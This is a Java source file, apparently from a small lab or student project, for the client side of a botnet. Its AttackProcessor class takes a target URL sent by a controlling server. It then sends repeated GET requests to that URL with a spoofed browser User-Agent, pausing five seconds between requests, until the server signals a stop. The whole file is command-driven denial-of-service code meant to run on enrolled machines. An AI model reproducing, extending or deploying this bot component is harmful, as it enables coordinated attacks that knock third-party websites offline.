package com.edsolab.BotNet.Client;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import com.edsolab.BotNet.TLV.Data;

public class AttackProcessor implements Runnable {

	private final Data responseData;

	public AttackProcessor(Data data) {
		this.responseData = data;
	}

	@Override
	public void run() {

		HttpURLConnection con = null;
		BufferedReader in = null;

		while (!KeyClient.stop) {
			try {
				// Lay dia chi addr cua Server yeu cau
				URL obj = new URL(new String(responseData.getData()));
				con = (HttpURLConnection) obj.openConnection();

				// optional default is GET
				con.setRequestMethod("GET");

				// add request header
				con.setRequestProperty("User-Agent", "Mozilla/5.0");

				in = new BufferedReader(new InputStreamReader(con.getInputStream()));
				String inputLine;
				StringBuffer response = new StringBuffer();

				while ((inputLine = in.readLine()) != null) {
					response.append(inputLine);
				}

				// print result
				System.out.println(response.toString());
				// Ngu 5 giay
				Thread.sleep(5000);

			} catch (Throwable e) {
				e.printStackTrace();
			} finally {
				if (con != null) {
					con.disconnect();
				}
				if (in != null) {
					try {
						in.close();
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
		}
	}

}
